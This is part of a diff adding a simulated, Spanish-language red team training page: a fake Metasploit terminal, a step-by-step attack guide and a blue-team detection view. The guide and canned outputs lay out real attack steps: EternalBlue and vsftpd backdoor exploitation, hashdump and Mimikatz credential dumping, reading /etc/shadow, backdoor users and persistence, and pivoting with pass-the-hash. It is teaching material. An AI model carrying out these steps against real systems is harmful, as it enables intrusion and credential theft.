+      "IPv4 Address : 10.10.10.5","IPv4 Netmask : 255.255.255.0","IPv4 Gateway : 10.10.10.1","",
+      "Interface  2","============","","Name         : Intel(R) I350 Gigabit Network Connection",
+      "Hardware MAC : 00:0c:29:8a:41:e8","MTU          : 1500","IPv4 Address : 192.168.50.5","IPv4 Netmask : 255.255.255.0","",
+      "[*] Segunda NIC: el servidor es puente hacia la red interna de servidores 192.168.50.0/24.",""]);
+    if(low==="arp")return printOut(["","  ARP cache","  =========","",
+      "  IP address       MAC address","  -----------       -----------","  192.168.50.1     00:50:56:c0:00:08",
+      "  192.168.50.30    00:0c:29:4e:77:19   ← "+SQL_HOST+" (SQL Server)",
+      "  192.168.50.5     00:0c:29:8a:41:e8   ← tú (WIN-SRV-DC01)","",
+      "[*] Host interno detectado: "+SQL_IP+" ("+SQL_HOST+") — solo alcanzable a través del pivote.",""]);
+    if(low==="route")return pivot?printOut(["","IPv4 network routes","===================","",
+      "    Subnet             Netmask            Gateway","    ------             -------            -------",
+      "    0.0.0.0            0.0.0.0            Session 1","    10.10.10.0         255.255.255.0      Session 1",
+      "    192.168.50.0       255.255.255.0       Session 1   ← pivote activo",""]):printOut(["[-] No hay rutas. Ejecuta 'run autoroute' para crear el pivote."]);
+    if(low==="run"&&args[0]==="autoroute")return runAutoroute();
+    if(low==="autoroute")return runAutoroute();
+    if(low==="portfwd"){if(!pivot)return printOut(["[-] portfwd necesita un pivote activo. Ejecuta 'run autoroute' primero."]);
+      if(args[0]==="add"){const lv=args[args.indexOf("-l")+1],rv=args[args.indexOf("-r")+1],pv=args[args.indexOf("-p")+1];
+        return printOut(["[*] Local TCP relay created: "+LHOST+":"+(lv||"3389")+" <-> "+(rv||SQL_IP)+":"+(pv||"3389"),
+          "[+] Túnel local levantado: ahora puedes alcanzar la red interna desde tu Kali."])}
+      return printOut(["usage: portfwd add -l <lport> -p <rport> -r <rhost>"])}
+    if(low==="ps")return printOut(["Process List","============",""," PID   PPID  Name                  Arch  Session  User",
+      " ---   ----  ----                  ----  -------  ----"," 324   660   services.exe          x64   0        NT AUTHORITY\\SYSTEM",
+      " 512   324   svchost.exe           x64   0        NT AUTHORITY\\SYSTEM"," 796   324   BackupSvc.exe         x64   0        LAB\\svc_backup",
+      " 1140  796   explorer.exe          x64   1        LAB\\svc_backup",""]);
+    if(low==="getprivs"){return isSystem?printOut(["","Process privileges:","====================","",
+      "  SeDebugPrivilege                  Enabled","  SeImpersonatePrivilege            Enabled","  SeTcbPrivilege                    Enabled",
+      "  SeAssignPrimaryTokenPrivilege     Enabled","  SeBackupPrivilege                 Enabled","  SeRestorePrivilege                Enabled","",
+      "[+] Todos los privilegios de SYSTEM disponibles.",""]):printOut(["","Process privileges:","====================","",
+      "  SeChangeNotifyPrivilege           Enabled","  SeShutdownPrivilege               Disabled","",
+      "[*] Privilegios limitados: necesitas 'getsystem' para escalar.",""])}
+    if(low==="getsystem"){if(isSystem)return printOut(["[*] This session is already running as NT AUTHORITY\\SYSTEM"]);
+      isSystem=true;mark("privesc");
+      return slowOut(["[*] Checking for system token privileges...",
+        "[*] Trying technique 1 of 4: Named Pipe Impersonation (In Memory/Admin) ...",
+        "[*] Trying technique 2 of 4: Named Pipe Impersonation (Dropper/Admin) ...",
+        "[+] Service VXhfqWk created successfully","[+] Service VXhfqWk started successfully",
+        "[*] GetSystem success: technique 2 (Named Pipe Impersonation).","",
+        "meterpreter session 1 is now running as NT AUTHORITY\\SYSTEM",""],140)}
+    if(low==="hashdump"){if(!isSystem)return printOut(["[-] hashdump necesita NT AUTHORITY\\SYSTEM.","[*] Ejecuta 'getsystem' primero."]);
+      mark("hashdump");
+      return printOut(["Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::",
+        "Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::",
+        "svc_backup:1008:aad3b435b51404eeaad3b435b51404ee:7f8fe03093cc84b26976e36c78a2e6a0:::","",
+        "[*] Hashes NTLM listos para crackeo offline: hashcat -m 1000 hashes.txt rockyou.txt",""])}
+    if(low==="creds_all"||low==="kiwi"){if(!isSystem)return printOut(["[-] Kiwi (Mimikatz) requiere SYSTEM.","[*] Ejecuta 'getsystem' primero."]);
+      mark("mimikatz");
+      return slowOut(["[*] Loading extension kiwi... (mimikatz 2.2.0)","","===== Credentials =====","wdigest","-------",
+        "  Username      : Administrator","  Domain        : WIN-SRV-DC01","  Password      : Adm1n#SRV2024!","","wdigest","-------",
+        "  Username      : svc_backup","  Domain        : LAB","  Password      : Backup2024!lab","","kerberos",
+        "--------","  Administrator : Adm1n#SRV2024!","",
+        "[+] Credenciales en claro capturadas de la memoria LSASS.",""],120)}
+    if(low==="persistence"){if(!isSystem)return printOut(["[-] La persistencia en HKLM requiere SYSTEM.","[*] Ejecuta 'getsystem' primero."]);
+      mark("persist");
+      return slowOut(["[*] Running Persistence script on the target...","[*] Creating persistence key:",
+        "    HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsDefenderUpdate",
+        '[+] Registry key created: "C:\\Users\\Public\\winupd.exe"',"[*] Uploading payload to C:\\Users\\Public\\winupd.exe...",
+        "[+] Payload uploaded (73802 bytes)","[*] La sesión se reestablecerá tras cada reinicio del servidor.","",
+        "[+] Persistencia instalada (Run key + payload).",""],130)}
+    if(low==="screenshot")return printOut(["[*] Capturando pantalla de la sesión activa...",
+      "[+] Screenshot saved to: /root/loot/screenshot_20261028211531.jpg",
+      "[*] Se observa la consola del Administrador abierta con notas del servidor.",""]);
+    if(low==="shell"){mode="winshell";
+      return printOut(["[-] Chdir failed:Resource temporarily unavailable - chdir to C:\\Windows\\Temp","",
+        "Channel 1 created.","Microsoft Windows [Version 6.1.7601]",
+        "Copyright (c) 2009 Microsoft Corporation.  All rights reserved.",""])}
+    if(low==="exit"||low==="quit"){mode="msf";return printOut(["[*] Shutting down session..."])}
+    return printOut(["[-] Unknown command: "+c+". Escribe 'help'."])}
+
+  // ---------- WINDOWS SHELL ----------
+  if(mode==="winshell"){
+    const onSql=host==="sql";
+    if(low==="whoami")return printOut([isSystem?"nt authority\\system":"win-srv-dc01\\svc_backup"]);
+    if(low==="help")return printOut(["  whoami · dir · type <archivo> · net user · exit"]);
+    if(low==="dir")return printOut(onSql?
+      [" El volumen de la unidad C no tiene nombre."," El número de serie del volumen es: 7A2E-9F1C","",
+       " Directorio de C:\\Users\\Administrator\\Desktop","","28/10/2026  09:14    <DIR>          .",
+       "28/10/2026  09:14    <DIR>          ..","12/02/2020  11:20           419.430   backup_db.bak",
+       "28/10/2026  09:14                32 flag3.txt","               2 archivos      419.462 bytes",
+       "               2 dirs  21.358.284.800 bytes libres"]:
+      [" El volumen de la unidad C no tiene nombre."," El número de serie del volumen es: 9C4F-A1B2","",
+       " Directorio de C:\\Users\\Administrator\\Desktop","","28/10/2026  09:14    <DIR>          .",
+       "28/10/2026  09:14    <DIR>          ..","17/03/2017  12:00            23.632 notas_servidor.txt",
+       "28/10/2026  09:14                32 flag.txt","               2 archivos        23.664 bytes",
+       "               2 dirs  38.204.011.520 bytes libres"]);
+    if(low==="type"){const f=(args[0]||"").toLowerCase();
+      if(!f)return printOut(["La sintaxis del comando no es correcta."]);
+      if(f.indexOf("flag3")>=0){if(!onSql)return printOut(["El sistema no puede encontrar el archivo especificado: "+args[0]]);
+        mark("flag_sql");return printOut([FLAG_SQL,"","¡Flag de SRV-SQL01 capturada! Llegaste hasta el corazón de la red interna."],"y")}
+      if(f.indexOf("flag")>=0){if(onSql)return printOut(["El sistema no puede encontrar el archivo especificado: "+args[0]]);
+        if(!isSystem)return printOut(["Acceso denegado.","","[*] Pista: necesitas ser SYSTEM. Vuelve con 'exit' y ejecuta 'getsystem'."]);
+        mark("flag_win");return printOut([FLAG_WIN,"","¡Flag de Windows capturada!"],"y")}
+      if(f.indexOf("notas")>=0)return printOut(["NOTAS DEL ADMINISTRADOR","-----------------------",
+        "- Pendiente: aplicar parche KB4013389 (MS17-010) <<<< ¡URGENTE!","- El servicio de backup usa la cuenta svc_backup (contraseña débil).",
+        "- Pendiente: actualizar vsftpd en web01 (2.3.4 tiene backdoor).","- Nunca apagar el DC los viernes."]);
+      return printOut(["El sistema no puede encontrar el archivo especificado: "+args[0]])}
+    if(low==="net"&&args[0]==="user")return printOut(["Cuentas de usuario de \\\\WIN-SRV-DC01","-----------------------------------",
+      "Administrator            Guest                    krbtgt","svc_backup","","Se ha completado el comando correctamente."]);
+    if(low==="exit"){mode=onSql?"msf":"meterpreter";host="win";return printOut(["[*] Exiting the Windows shell..."])}
+    return printOut(["'"+c+"' no se reconoce como un comando interno o externo."])}
+
+  // ---------- LINUX SHELL ----------
+  if(mode==="linshell"){
+    if(low==="clear"){term.innerHTML="";return renderInput(false)}
+    if(low==="help")return printOut(["Shell root de Linux (web01):","  id · whoami · uname -a · ifconfig · ls /var/www",
+      "  cat /etc/shadow · cat /root/flag2.txt","  persistence (clave SSH) · adduser hacker · crontab -l · exit"]);
+    if(low==="id")return printOut(["uid=0(root) gid=0(root) groups=0(root)"]);
+    if(low==="whoami")return printOut(["root"]);
+    if(low==="uname")return printOut(["Linux web01 4.4.0-116-generic #140-Ubuntu SMP x86_64 GNU/Linux"]);
+    if(low==="ifconfig"||low==="ip")return printOut(["ens33   Link encap:Ethernet  HWaddr 00:0c:29:b1:7c:33",
+      "        inet addr:10.10.10.20  Bcast:10.10.10.255  Mask:255.255.255.0","        UP BROADCAST RUNNING MULTICAST  MTU:1500","",
+      "lo      Link encap:Local Loopback","        inet addr:127.0.0.1  Mask:255.0.0.0",""]);
+    if(low==="ls"&&(args[0]||"").indexOf("/var/www")===0)return printOut(["html:","index.html  app.js  uploads/  config.php.bak","",
+      "uploads:","doc_2025_final.pdf  photo1.jpg  shell.php.bak","",
+      "[*] Pista real: un .bak con credenciales es un hallazgo clásico que va al informe."]);
+    if(low==="cat"&&(args[0]||"").indexOf("shadow")>=0){mark("shadow");
+      return printOut(["root:$6$rounds=5000$Xk9mQ2$sL8vNq3R7Tz1Yw4eF6gHj8K0lM2nP4qR6sT8uV0wX2yZ4aB6cD8eF0gHi2Jk4Lm6N:19980:0:99999:7:::",
+        "daemon:*:19980:0:99999:7:::","www-data:$6$rounds=5000$Pq7wE4$hN4mB1vC5xZ8aS2dF6gHj8K0lM2nP4qR6sT8uV0wX2yZ4aB6cD8eF0gHi2Jk4Lm6N:19980:0:99999:7:::",
+        "devops:$6$rounds=5000$Rt3yU8$kM9nP4qR6sT8uV0wX2yZ4aB6cD8eF0gHi2Jk4Lm6NpQ5rS7tU9vW1xY3zA5bC7dE9f:19980:0:99999:7:::","",
+        "[*] Hashes SHA-512 ($6$) — crackeables offline: hashcat -m 1800 shadow.txt rockyou.txt",""])}
+    if(low==="cat"&&(args[0]||"").indexOf("flag2")>=0){mark("flag_lin");
+      return printOut([FLAG_LIN,"","¡Flag de Linux capturada!"],"y")}
+    if(low==="adduser"){if(args[0]==="hacker"){mark("persist_lin");
+      return slowOut(["Adding user `hacker' ...","Adding new group `hacker' (1001) ...",
+        "Adding new user `hacker' (1001) with group `hacker' ...","[+] Usuario 'hacker' creado y añadido al grupo sudo.","",
+        "[+] Persistencia: credenciales de respaldo para el acceso (hacker:Str0ngP@ss!).",""],150)}
+      return printOut(["adduser: sólo se simula el usuario 'hacker' en este laboratorio."])}
+    if(low==="persistence"){mark("persist_lin");
+      return slowOut(["[*] Generando par de claves SSH en el objetivo...","[+] /root/.ssh/id_rsa_lab creado",
+        "[*] Añadiendo clave pública a /root/.ssh/authorized_keys...","[+] Clave autorizada instalada para root",
+        "[*] Configurando PermitRootLogin prohibit-password...","",
+        "[+] Persistencia SSH activa: podrás volver con ssh -i id_rsa_lab root@"+LIN_IP,""],150)}
+    if(low==="crontab")return printOut(["*/5 * * * * root /usr/local/bin/backup-sync.sh","",
+      "[*] Un cron como root ejecutando un script world-writable es otro vector de persistencia/escalada."]);
+    if(low==="exit"){mode="msf";return printOut(["[*] Exiting shell session 2..."])}
+    return printOut(["bash: "+c+": command not found"])}
+}
+
+// ====== PESTAÑAS ======
+function setTab(t){
+  tabNow=t;
+  document.getElementById("tab-console").className="tab"+(t==="console"?" active":"");
+  document.getElementById("tab-instructions").className="tab"+(t==="instructions"?" active":"");
+  document.getElementById("tab-blue").className="tab"+(t==="blue"?" active blue":"");
+  if(t==="console"){term.style.display="block";panel.style.display="none";renderInput(busy)}
+  else{term.style.display="none";panel.style.display="block";renderPanel(t)}
+  if(t==="console"){const i=document.getElementById("cmd");if(i&&!i.disabled)i.focus()}
+}
+
+function renderPanel(t){
+  if(t==="instructions"){
+    panel.innerHTML=
+    "<section><h2 class='h2g'>🎯 MISIÓN</h2><p>Como operador Red Team con acceso a la red interna <b>10.10.10.0/24</b> desde tu Kali (<b>"+LHOST+"</b>), debes comprometer los objetivos, escalar privilegios, ejecutar post-explotación y capturar todas las flags:</p>"+
+    "<ul><li>🎯 <b>"+WIN_IP+"</b> — Windows Server 2008 R2 (MS17-010 EternalBlue)</li>"+
+    "<li>🎯 <b>"+LIN_IP+"</b> — Ubuntu 16.04 con vsftpd 2.3.4 backdoor (CVE-2011-2523)</li>"+
+    "<li>🎯 <b>"+SQL_IP+"</b> — SQL Server interno, <b>solo alcanzable</b> pivotando (red 192.168.50.0/24)</li></ul></section>"+
+    "<section><h2 class='h2g'>FASE 1 · Reconocimiento</h2><ol>"+
+    "<li><code>ifconfig</code> · <code>ping "+WIN_IP+"</code></li>"+
+    "<li><code>nmap -sV -sC -p- "+WIN_IP+"</code> → SMB vulnerable ms17-010<br><span class='hint'>Fíjate en el puerto 445 y el script smb-vuln-ms17-010 → VULNERABLE</span></li>"+
+    "<li><code>nmap -sV -sC -p- "+LIN_IP+"</code> → vsftpd 2.3.4 backdoored</li></ol></section>"+
+    "<section><h2 class='h2r'>FASE 2 · Compromiso inicial</h2><ol>"+
+    "<li><code>msfconsole</code></li>"+
+    "<li><b>Windows:</b> <code>use "+WIN_EXPLOIT+"</code> → <code>set RHOSTS "+WIN_IP+"</code> → <code>exploit</code><br><span class='hint'>→ Meterpreter como LAB\\svc_backup (bajo privilegio)</span></li>"+
+    "<li><b>Linux:</b> <code>back</code> · <code>use "+LIN_EXPLOIT+"</code> → <code>set RHOSTS "+LIN_IP+"</code> → <code>exploit</code><br><span class='hint'>→ Shell como root directamente (el backdoor da uid=0)</span></li></ol></section>"+
+    "<section><h2 class='h2p'>FASE 3 · Escalada + Post-explotación Windows</h2><ol>"+
+    "<li><code>getuid</code> · <code>getprivs</code> — comprueba tus privilegios</li>"+
+    "<li><code>getsystem</code> → <b>NT AUTHORITY\\SYSTEM</b></li>"+
+    "<li><code>hashdump</code> — hashes NTLM del SAM</li>"+
+    "<li><code>creds_all</code> — Mimikatz/kiwi: contraseñas en claro desde LSASS</li>"+
+    "<li><code>persistence</code> — clave Run del registro</li>"+
+    "<li><code>screenshot</code> — captura del escritorio</li>"+
+    "<li><code>shell</code> → <code>type flag.txt</code> — flag de Windows</li></ol></section>"+
+    "<section><h2 class='h2p'>FASE 4 · Post-explotación Linux (root)</h2><ol>"+
+    "<li>En <code>root@web01:~#</code>: <code>id</code> · <code>uname -a</code></li>"+
+    "<li><code>cat /etc/shadow</code> — exfiltra hashes SHA-512 (hashcat -m 1800)</li>"+
+    "<li><code>ls /var/www</code> — busca archivos .bak con credenciales</li>"+
+    "<li><code>persistence</code> — clave SSH en authorized_keys de root</li>"+
+    "<li><code>adduser hacker</code> — usuario de respaldo con sudo</li>"+
+    "<li><code>cat /root/flag2.txt</code> — flag de Linux</li></ol></section>"+
+    "<section><h2 class='h2o'>FASE 5 · Pivoting + Movimiento Lateral → red interna</h2><ol>"+
+    "<li>En Meterpreter: <code>ifconfig</code> revela una segunda NIC en <b>192.168.50.5</b></li>"+
+    "<li><code>arp</code> — descubre <b>"+SQL_IP+" ("+SQL_HOST+")</b></li>"+
+    "<li><code>run autoroute</code> — crea el pivote hacia 192.168.50.0/24</li>"+
+    "<li><code>portfwd add -l 3389 -p 3389 -r "+SQL_IP+"</code> — túnel local</li>"+
+    "<li><code>exit</code> + <code>back</code> → <code>search psexec</code></li>"+
+    "<li><code>use "+PSEXEC_EXPLOIT+"</code> → <code>set RHOSTS "+SQL_IP+"</code> → <code>exploit</code><br><span class='hint'>→ Pass-the-Hash: reutiliza el hash NTLM de Administrator sin conocer la contraseña</span></li>"+
+    "<li>Sesión como SYSTEM en "+SQL_HOST+" → <code>shell</code> → <code>type flag3.txt</code></li></ol></section>"+
+    "<section><h2 class='h2y'>FASE 6 · Cierre de la operación</h2><ol>"+
+    "<li>Vuelve a Kali y ejecuta <code>cat flag_final.txt</code></li>"+
+    "<li>Redacta el informe: hallazgos y remediación (parches, SMBv1, LAPS, segmentación, NTLM, FIM).</li></ol></section>"+
+    "<section class='roe'><h2>⚖️ REGLAS DE ENFRENTAMIENTO (ROE)</h2><ul>"+
+    "<li>Laboratorio cerrado y simulado: no hay tráfico real ni sistemas reales comprometidos.</li>"+
+    "<li>Las técnicas mostradas solo deben usarse en entornos autorizados.</li>"+
+    "<li>En un ejercicio real: documenta cada acción, minimiza el impacto, reporta credenciales de forma segura y elimina toda persistencia al finalizar.</li></ul></section>";
+    return}
+  // BLUE TEAM
+  let firedCount=detections.filter(d=>done[d.id]).length;
+  let html="<section class='soc-intro'><h2>🛡️ VISTA SOC — Detección del adversario</h2>"+
+    "<p>Esta consola muestra lo que <b>habría visto el equipo azul</b>: cada acción que ejecutes como rojo genera aquí su evento de log (Windows Event Log, Sysmon, Suricata, auditd) con su técnica MITRE ATT&CK y la remediación aplicable. Los hallazgos aún no provocados aparecen atenuados.</p>"+
+    "<p class='dim'>Alertas activas: <b style='color:#38bdf8'>"+firedCount+"</b> de "+detections.length+" · Usa TERMINAL para ejecutar el ataque y vuelve aquí para ver su huella.</p></section>";
+  detections.forEach(function(d){
+    const fired=!!done[d.id];
+    html+="<section class='det"+(fired?" fired":"")+"'>"+
+      "<span class='tag'>"+(fired?"🔴 ALERTA ACTIVA":"PENDIENTE")+"</span><h3>"+d.title+"</h3>"+
+      "<div class='src' style='font-size:11px;color:#94a3b8'>"+d.tactic+"</div>"+
+      "<div class='src'>Fuente: "+d.source+" · <span>"+d.eventId+"</span></div>"+
+      "<pre>"+esc(d.log.join("\n"))+"</pre>"+
+      "<div class='fix'><b>Remediación: </b>"+esc(d.fix)+"</div></section>"});
+  html+="<section class='lesson'><h2>📚 Lección defensiva del laboratorio</h2><ul>"+
+    "<li>Un único fallo de parcheo (MS17-010) bastó para comprometer perímetro, credenciales, red interna y el servidor SQL: <b>defensa en profundidad</b>.</li>"+
+    "<li>Casi todas las técnicas son detectables con telemetría básica bien monitorizada (Sysmon, auditd, IDS, eventos 4624/7045/13).</li>"+
+    "<li>La segmentación de red y LAPS habrían contenido el movimiento lateral sin detección avanzada.</li>"+
+    "<li>Ejercicio sugerido: redactar el informe de incidente desde esta pestaña (qué, cuándo, cómo se detectó y cómo se remedia).</li></ul></section>";
+  panel.innerHTML=html;
+}
+
+// ====== BANNER INICIAL ======
+[ "██████╗ ███████╗██████╗ ██╗  ██╗    ██╗    ██╗███████╗██████╗",
+  "██╔══██╗██╔════╝██╔══██╗██║ ██╔╝    ██║    ██║██╔════╝██╔══██╗",
+  "██████╔╝█████╗  ██████╔╝█████╔╝     ██║ █╗ ██║█████╗  ██████╔╝",
+  "██╔══██╗██╔══╝  ██╔══██╗██╔═██╗     ██║███╗██║██╔══╝  ██╔══██╗",
+  "██║  ██║███████╗██║  ██║██║  ██╗    ╚███╔███╔╝███████╗██║  ██║",
+  "╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝     ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝","",
+  "     RED TEAM LAB · 2 objetivos + red interna · pivoting & lateral movement","",
+  "  [!] LABORATORIO CERRADO Y SIMULADO — SOLO CON FINES EDUCATIVOS","",
+  "  Objetivo 1: "+WIN_IP+"  WIN-SRV-DC01 — Windows Server 2008 R2 (MS17-010)",
+  "  Objetivo 2: "+LIN_IP+"  web01 — Ubuntu 16.04 · vsftpd 2.3.4 backdoor",
+  "  Interno:    "+SQL_IP+"  "+SQL_HOST+" — solo vía pivote a través de WIN-SRV-DC01",
+  "  Tu máquina:  Kali Linux ("+LHOST+")","",
+  "  Escribe 'help' para ver los comandos disponibles.",
+  "  Consulta la pestaña INSTRUCCIONES para la guía paso a paso.",""
+].forEach(l=>addLine(l, l.indexOf("█")>=0||l.indexOf("╚═")>=0?"g":l.indexOf("[!]")>=0?"r":""));
+renderObjs();
+renderInput(false);
+</script>
+</body>
+</html>
